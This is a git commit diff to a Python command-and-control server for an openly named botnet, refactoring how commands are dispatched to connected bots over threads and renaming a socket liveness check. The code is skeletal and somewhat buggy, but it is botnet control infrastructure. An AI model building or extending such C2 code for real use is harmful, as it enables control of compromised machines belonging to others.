e52fbe4400a8b682b43da6eb9aea7a5659ce524b
Robbe Bryssinck <robbebryssinck@gmail.com>
2020-10-09 11:40:30 -0700

    Refactored socket ping function

--- Botnet/server/c2server.py
+++ Botnet/server/c2server.py
@@ -9,7 +9,8 @@ class C2server():
     def __init__(self, user_id, bot_socket):
         self.user_id = user_id
         self.bots = [bot_socket]
-
+        self.event_state = threading.Event()
+    
     def execute_command(self, command):
         """
         Command botnet to execute command
@@ -19,9 +20,16 @@ class C2server():
         if not self.bots:
             raise NoBotsException()
 
+        """
         with concurrent.futures.ProcessPoolExecutor() as executor:
             futures = [executor.submit(self.command_bot, bot) for bot in self.bots]
         results = [f.result() for f in futures]
+        """
+
+        threads = [threading.Thread(self.command_bot, args=(command, bot)) for bot in self.bot_list]
+
+        for thread in threads:
+            thread.start()
 
 
     def command_bot(self, command, bot):
@@ -29,11 +37,15 @@ class C2server():
             return "Dead bot"
 
         bot.sendall(str(command.commandId).encode())
+        if bot.recv(1024).decode() == "Started":
+            command.command_socket.sendall(b"Started")
 
-    def is_bot_alive(self, bot):
+        self.event_state.wait()
+
+    def is_socket_alive(self, sock):
         try:
-            bot.sendall(b"Are you alive?")
-            response = bot.recv(1024)
+            sock.sendall(b"Are you alive?")
+            response = sock.recv(1024)
             if response == b"":
                 return False
         # TODO: put in proper exception handling for dead socket
